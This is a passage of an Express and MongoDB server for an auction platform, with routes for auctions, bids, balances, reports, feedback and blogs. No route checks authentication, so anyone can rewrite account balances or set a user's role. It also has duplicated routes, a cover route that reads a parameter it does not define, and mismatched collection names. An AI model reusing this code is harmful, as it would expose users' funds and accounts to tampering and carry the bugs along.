    app.get("/auction/:id", async (req, res) => {
      const { id } = req.params;
      try {
        const query = { _id: new ObjectId(id) };
        const result = await auctionCollection.findOne(query);
        res.send(result);
      } catch (error) {
        res.status(500).send({ message: "Failed to fetch Auction", error });
      }
    });

    app.get("/auctions", async (req, res) => {
      try {
        const { email } = req.query;
        if (email) {
          const auctions = await auctionCollection
            .find({ sellerEmail: email })
            .toArray();
          res.send(auctions);
        } else {
          const result = await auctionCollection.find().toArray();
          res.send(result);
        }
      } catch (error) {
        res.status(500).send({ message: "Internal Server Error", error });
      }
    });

    //Upcoming Auction
    app.get("/upcoming-auctions", async (req, res) => {
      try {
        const result = await auctionCollection.find().toArray();
        res.send(result);
      } catch (error) {
        res.status(500).send({ message: "Internal Server Error", error });
      }
    });

    app.post("/auctions", async (req, res) => {
      const auction = req.body;
      const result = await auctionCollection.insertOne(auction);
      res.send(result);
    });
    app.patch("/auctions/payment/:id", async (req, res) => {
      try {
        const { id } = req.params;
        const { payment, paymentDetails } = req.body;

        if (!payment) {
          return res.status(400).send({
            success: false,
            message: "Payment status is required",
          });
        }

        const filter = { _id: new ObjectId(id) };
        const updateDoc = {
          $set: {
            payment,
            paymentDetails,
            paymentDate: new Date(),
          },
        };

        const result = await auctionCollection.updateOne(filter, updateDoc);

        if (result.matchedCount === 0) {
          return res.status(404).send({
            success: false,
            message: "Auction not found",
          });
        }

        res.send({
          success: true,
          message: "Payment status updated successfully",
          result,
        });
      } catch (error) {
        console.error("Error updating payment status:", error);
        res.status(500).send({
          success: false,
          message: "Failed to update payment status",
          error: error.message,
        });
      }
    });
    app.patch("/auctions/:id", async (req, res) => {
      const auctionId = req.params.id;
      const { status, deliveryStatus, notes } = req.body;

      const filter = { _id: new ObjectId(auctionId) };
      const updateFields = {};

      if (status) updateFields.status = status;
      if (deliveryStatus) updateFields.deliveryStatus = deliveryStatus;
      if (notes) updateFields.notes = notes;

      const updateDoc = { $set: updateFields };

      try {
        const result = await auctionCollection.updateOne(filter, updateDoc);
        res.send(result);
      } catch (error) {
        res.status(500).send({ message: "Update failed", error });
      }
    });

    app.delete("/auctions/:id", async (req, res) => {
      try {
        const id = req.params.id;
        const filter = { _id: new ObjectId(id) };
        const result = await auctionCollection.deleteOne(filter);
        res.send(result);
      } catch (error) {
        res.status(500).send({ message: "Internal Server Error", error });
      }
    });

    //ended auctions api
    app.get("/endedAuctions", async (req, res) => {
      try {
        const result = await endedAuctionCollection.find().toArray();
        res.send(result);
      } catch (error) {
        res.status(500).send({ message: "Internal Server Error", error });
      }
    });

    app.post("/endedAuctions", async (req, res) => {
      try {
        const { auctionId } = req.body;
        const query = { _id: new ObjectId(auctionId) };

        // 1. Find the auction
        const auction = await auctionCollection.findOne(query);
        if (!auction) {
          return res.status(404).send({ message: "Auction not found" });
        }

        // 2. Delete it from current auctions
        await auctionCollection.deleteOne(query);

        // 3. Insert into endedAuctionCollection
        const insertResult = await endedAuctionCollection.insertOne(auction);

        res.send({ message: "Auction ended successfully", data: insertResult });
      } catch (error) {
        res.status(500).send({ message: "Internal server error", error });
      }
    });

    //auction er top bidders update

    app.patch("/auctionList/topBidders", async (req, res) => {
      try {
        const { topBidders } = req.body;

        if (
          !topBidders ||
          !Array.isArray(topBidders) ||
          topBidders.length === 0
        ) {
          return res
            .status(400)
            .send({ success: false, message: "Invalid topBidders data." });
        }

        const auctionId = topBidders[0]?.auctionId;

        if (!auctionId) {
          return res.status(400).send({
            success: false,
            message: "auctionId missing in topBidders.",
          });
        }

        const filter = { _id: new ObjectId(auctionId) };
        const updateDoc = {
          $set: {
            topBidders: topBidders,
          },
        };

        const result = await auctionCollection.updateOne(filter, updateDoc);

        res.send({
          success: true,
          message: "Top bidders updated successfully.",
          result,
        });
      } catch (error) {
        console.error("Error updating topBidders:", error);
        res.status(500).send({ success: false, message: "Server error." });
      }
    });

    // Specific user.accountBalance update
    app.patch("/accountBalance/:id", async (req, res) => {
      const userId = req.params.id;
      const { accountBalance, transaction } = req.body;

      if (!accountBalance && !transaction) {
        return res
          .status(400)
          .send({ success: false, message: "accountBalance is required!" });
      }

      const updatedUser = await userCollection.updateOne(
        { _id: new ObjectId(userId) },
        { $set: { accountBalance }, $push: { transactions: transaction } }
      );

      if (updatedUser.modifiedCount > 0) {
        res.send({
          success: true,
          message: "User accountBalance updated successfully!",
        });
      } else {
        res.status(404).send({
          success: false,
          message: "User not found or accountBalance not changed!",
        });
      }
    });

    // Specific user.recentActivity  update
    app.patch("/updateUserRecentActivity/:id", async (req, res) => {
      const userId = req.params.id;
      const { bidData } = req.body;

      if (!bidData) {
        return res
          .status(400)
          .send({ success: false, message: "valid data is required!" });
      }

      const updatedUser = await userCollection.updateOne(
        { _id: new ObjectId(userId) },
        { $push: { recentActivity: bidData } }
      );

      if (updatedUser.modifiedCount > 0) {
        res.status(201).send({
          success: true,
          message: "User data updated successfully!",
        });
      } else {
        res.status(404).send({
          success: false,
          message: "User not found or data not changed!",
        });
      }
    });

    // Live Bidding APIs
    app.get("/live-bid/top", async (req, res) => {
      const { auctionId } = req.query;
      const query = auctionId ? { auctionId } : {};
      const result = await SpecificUserLiveBiddingCollection.aggregate([
        { $match: query },
        {
          $group: {
            _id: "$email",
            name: { $first: "$name" },
            photo: { $first: "$photo" },
            amount: { $max: "$amount" },
            auctionId: { $first: "$auctionId" },
          },
        },
        { $sort: { amount: -1 } },
        { $limit: 3 },
      ]).toArray();
      res.send(result);
    });

    app.get("/live-bid/recent", async (req, res) => {
      const { auctionId } = req.query;
      const query = auctionId ? { auctionId } : {};
      const result = await SpecificUserLiveBiddingCollection.find(query)
        .sort({ createdAt: -1 })
        .limit(3)
        .toArray();
      res.send(result);
    });

    app.post("/live-bid", async (req, res) => {
      const liveBid = req.body;
      liveBid.createdAt = new Date();
      const result = await SpecificUserLiveBiddingCollection.insertOne(liveBid);
      await auctionCollection.updateOne(
        { _id: new ObjectId(liveBid.auctionId) },
        { $set: { currentBid: liveBid.amount } }
      );
      res.send(result);
    });

    // Reports API
    app.post("/reports", async (req, res) => {
      try {
        const reports = req.body;
        const result = await reportsCollection.insertOne(reports);
        res.send({ success: true, result });
      } catch (error) {
        res.status(500).send("internal server error", error);
      }
    });
    // GET a report(Joyeta)
    app.get("/reports", async (req, res) => {
      try {
        const reports = await reportCollection.find().toArray();
        res.send(reports);
      } catch (error) {
        res
          .status(500)
          .send({ message: "Failed to fetch reports", error: error.message });
      }
    });

    // POST a report (Joyeta)
    app.post("/reports", async (req, res) => {
      try {
        const report = req.body;

        if (!report || Object.keys(report).length === 0) {
          return res.status(400).send({ message: "Report data is required" });
        }

        const result = await reportCollection.insertOne(report);
        res.send(result);
      } catch (error) {
        res
          .status(500)
          .send({ message: "Failed to submit report", error: error.message });
      }
    });

    //feedback get method

    app.get("/feedbacks", async (req, res) => {
      try {
        const feedbacks = await feedbackCollection.find().toArray();
        res.status(200).send(feedbacks);
      } catch (error) {
        res.status(500).send("internal server error", error);
      }
    });

    //feedback post api

    app.post("/feedback", async (req, res) => {
      try {
        const feedback = req.body;
        if (!feedback) {
          return res.status(400).send({ message: "Feedback data is required" });
        }
        const result = await feedbackCollection.insertOne(feedback);
        res.status(200).send({ success: true, result });
      } catch (error) {
        res.status(500).send("internal server error", error);
      }
    });

    // POST a report (Joyeta)
    app.post("/reports", async (req, res) => {
      try {
        const report = req.body;

        if (!report || Object.keys(report).length === 0) {
          return res.status(400).send({ message: "Report data is required" });
        }

        const result = await reportCollection.insertOne(report);
        res.send(result);
      } catch (error) {
        res
          .status(500)
          .send({ message: "Failed to submit report", error: error.message });
      }
    });

    //feedback get method

    app.get("/feedbacks", async (req, res) => {
      try {
        const feedbacks = await feedbackCollection.find().toArray();
        res.status(200).send(feedbacks);
      } catch (error) {
        res.status(500).send("internal server error", error);
      }
    });

    //feedback post api

    app.post("/feedback", async (req, res) => {
      try {
        const feedback = req.body;
        if (!feedback) {
          return res.status(400).send({ message: "Feedback data is required" });
        }
        const result = await feedbackCollection.insertOne(feedback);
        res.status(200).send({ success: true, result });
      } catch (error) {
        res.status(500).send("internal server error", error);
      }
    });
    // cover collection api
    // app.post("/cover", async (req, res) => {
    //   const feedback = req.body;

    //   const result = await CoverCollection.insertOne(feedback);
    //   res.status(200).send({ success: true, result });
    // });

    app.patch("/cover", async (req, res) => {
      const userId = req.params.id;
      const { cover } = req.body;
      const filter = { _id: new ObjectId(userId) };
      const updateDoc = { $set: { cover: cover } };
      const result = await userCollection.updateOne(filter, updateDoc);
      res.send(result);
    });
    // Update user profile
    app.patch("/user/:email", async (req, res) => {
      const email = req.params.email;
      const updates = req.body;
      // List of allowed fields to update
      const allowedFields = [
        "name",
        "email",
        "photo",
        "role",
        "AuctionsWon",
        "ActiveBids",
        "TotalSpent",
        "accountBalance",
        "BiddingHistory",
        "onGoingBid",
        "Location",
        "memberSince",
        "recentActivity",
        "watchingNow",
      ];

      // Filter updates to only include allowed fields
      const filteredUpdates = Object.keys(updates)
        .filter((key) => allowedFields.includes(key))
        .reduce((obj, key) => {
          obj[key] = updates[key];
          return obj;
        }, {});

      const filter = { email: email };
      const updateDoc = { $set: filteredUpdates };

      try {
        const result = await userCollection.updateOne(filter, updateDoc);
        if (result.matchedCount === 0) {
          return res.status(404).send({ message: "User not found" });
        }
        const updatedUser = await userCollection.findOne(filter);
        res.send(updatedUser);
      } catch (err) {
        res.status(500).send({ message: "Failed to update profile" });
      }
    });

    // Update cover photo
    app.patch("/cover/:id", async (req, res) => {
      const userId = req.params.id;
      const { cover } = req.body;
      const filter = { _id: new ObjectId(userId) };
      const updateDoc = { $set: { cover: cover } };
      try {
        const result = await userCollection.updateOne(filter, updateDoc);
        if (result.matchedCount === 0) {
          return res.status(404).send({ message: "User not found" });
        }
        const updatedUser = await userCollection.findOne(filter);
        res.send(updatedUser);
      } catch (err) {
        res.status(500).send({ message: "Failed to update cover" });
      }
    });

    // Upload photo
    app.post("/upload-photo", upload.single("photo"), async (req, res) => {
      try {
        const photo = req.file;
        if (!photo) {
          return res.status(400).send({ message: "No photo uploaded" });
        }
        // Upload to Cloudinary
        const uploadResult = await new Promise((resolve, reject) => {
          cloudinary.uploader
            .upload_stream({ resource_type: "image" }, (error, result) => {
              if (error) reject(error);
              else resolve(result);
            })
            .end(photo.buffer);
        });
        res.send({ url: uploadResult.secure_url });
      } catch (err) {
        res.status(500).send({ message: "Failed to upload photo" });
      }
    });

    app.get("/cover", async (req, res) => {
      try {
        const feedbacks = await CoverCollection.find().toArray();
        res.status(200).send(feedbacks);
      } catch (error) {
        res.status(500).send("internal server error", error);
      }
    });
    // app.get("/cover/:userId", async (req, res) => {
    //   try {
    //     const userId = req.query.userId; // Get userId from query parameters
    //     const query = { userId: userId };

    //     const result = await CoverCollection.findOne(query);
    //     if (result) {
    //       res.status(200).send(result);
    //     } else {
    //       res.status(404).send({ message: "Cover not found" });
    //     }
    //   } catch (error) {
    //     res.status(500).send({ message: "Internal server error", error });
    //   }
    // });
    // Debug endpoint to check active socket connections
    app.get("/debug/socket-connections", (req, res) => {
      const connections = Array.from(io.sockets.sockets).map(
        ([id, socket]) => ({
          id,
          rooms: Array.from(socket.rooms),
        })
      );

      res.json({
        activeConnections: connections.length,
        connections,
      });
    });

    app.get("/allBlogs", async (req, res) => {
      try {
        const blogs = await blogCollection.find().toArray(); // Adjust to your actual schema or data retrieval method

        if (!blogs || blogs.length === 0) {
          return res
            .status(404)
            .json({ message: "No blogs found for this email." });
        }

        res.status(200).json(blogs); // Respond with the blogs
      } catch (error) {
        console.error(error);
        res
          .status(500)
          .json({ message: "Server error, please try again later." });
      }
    });

    app.get("/blogs/:email", async (req, res) => {
      const email = req.params.email; // Extract email parameter from URL

      try {
        const query = { authorEmail: email };
        const blogs = await blogCollection.find(query).toArray(); // Adjust to your actual schema or data retrieval method

        if (!blogs || blogs.length === 0) {
          return res
            .status(404)
            .json({ message: "No blogs found for this email." });
        }

        res.status(200).json(blogs); // Respond with the blogs
      } catch (error) {
        console.error(error);
        res
          .status(500)
          .json({ message: "Server error, please try again later." });
      }
    });

    app.get("/blog/:id", async (req, res) => {
      const { id } = req.params;
      try {
        const blog = await blogCollection.findOne({ _id: new ObjectId(id) });
        if (!blog) {
          return res.status(404).json({ message: "Blog not found" });
        }
        res.json(blog);
      } catch (error) {
        res.status(500).json({ message: "Error fetching blog" });
      }
    });

    app.post("/addBlogs", async (req, res) => {
      try {
        const { title, imageUrls, fullContent } = req.body;

        if (!title || !imageUrls.length || !fullContent) {
          return res.status(400).json({ message: "All fields are required." });
        }
        const blog = req.body;

        const newBlog = {
          ...blog,
          createdAt: new Date(),
        };

        const result = await blogCollection.insertOne(newBlog);

        if (result.insertedId) {
          res.status(201).json({
            message: "Blog created successfully",
            blogId: result.insertedId,
          });
        } else {
          res.status(500).json({ message: "Failed to create blog." });
        }
      } catch (error) {
        console.error("Error in /add-blogs:", error);
        res.status(500).json({ message: "Internal Server Error" });
      }
    });

    // Ensure that the route matches the one you're calling in the frontend

    app.patch("/updateBlog/:id", async (req, res) => {
      const { id } = req.params;
      const { title, fullContent, imageUrls } = req.body;

      try {
        const result = await blogCollection.updateOne(
          { _id: new ObjectId(id) }, // match document by id
          {
            $set: {
              title,
              fullContent,
              imageUrls: imageUrls || [],
            },
          }
        );

        if (result.matchedCount === 0) {
          return res
            .status(404)
            .json({ success: false, message: "Blog not found" });
        }

        res.json({ success: true, message: "Blog updated successfully" });
      } catch (error) {
        console.error("Error updating blog:", error);
        res.status(500).json({
          success: false,
          message: "Server Error",
          error: error.message,
        });
      }
    });

    app.delete("/delete/:id", async (req, res) => {
      const { id } = req.params; // Extract the blog post ID from the URL parameter

      try {
        // Attempt to delete the blog post by its ID from the database
        const result = await blogCollection.deleteOne({
          _id: new ObjectId(id),
        });

        // Check if the blog post was found and deleted
        if (result.deletedCount === 0) {
          return res.status(404).json({ message: "Blog post not found." });
        }

        // Respond with a success message if the deletion is successful
        res.status(200).json({ message: "Blog post deleted successfully." });
      } catch (error) {
        console.error("Error deleting blog post:", error);
        res.status(500).json({ message: "Internal Server Error" });
      }
    });
  } finally {
  }
}
run().catch(console.dir);

app.get("/", (req, res) => {
  res.send("RexAuction Running with Socket.IO!");
});

server.listen(port, () => {
  console.log(`Running on port ${port}`);
});
